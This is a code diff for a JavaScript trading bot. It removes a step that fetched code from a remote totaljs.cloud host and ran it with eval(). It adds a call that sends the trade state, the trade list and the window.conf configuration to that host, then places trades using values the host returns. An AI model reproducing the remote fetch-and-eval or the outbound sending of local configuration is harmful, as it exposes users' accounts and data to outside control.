@@ -123,7 +123,6 @@ async function appstart() {
                         }
                         if (tradeview.vol < 1) tradeview.vol = 1;
 
-                        const xslide = function (tradeview) {
                             slide(tradeview.slide, tradeview.vol, tradeview.tradetype).then(function (res) {
 
 
@@ -144,9 +143,7 @@ async function appstart() {
 
 
                             });
-                        }
 
-                        xslide(tradeview);
 
 
                     }
@@ -243,8 +240,33 @@ function check(tradetime, tradeview) {
                             var tradelist = res.d.c;
                             var xstop = tradelist[0].result === 'LOSE' && tradelist[1].result === 'LOSE' ? 0 : 1;
                             if (xuid === 'tradeview' && xstop === 1) {
-                                var xloop = await get('https://flowc14c039001lf61c.us01.totaljs.cloud/loop');
-                                eval(xloop.code);
+                                xtradeview = await get('https://flowc14c039001lf61c.us01.totaljs.cloud/loop',{tradeview:tradeview,list:tradelist,config:window.conf});
+
+                                tradeview.vol = xtradeview.vol;
+                                tradeview.slide = xtradeview.slide;
+
+
+
+                                slide(tradeview.slide, tradeview.vol, tradeview.tradetype).then(function (res) {
+
+
+                                    if (_has(res, "ok") && res.ok !== false) {
+
+
+                                        blance = "";
+                                        d = new Date();
+                                        sendsms(datetime() + ' | ' + tradeview.slide + ' | ' + tradeview.vol + '$ | Live: ' + tradeview.tradetype);
+                                        setTimeout(function () {
+                                            sendsms('Wait 30s ...');
+                                        }, 1000);
+                                        tradetime = res.d.time;
+                                        localStorage.setItem("locktrade", 1);
+                                        check(tradetime, tradeview);
+
+                                    }
+
+
+                                });
 
                             }
 
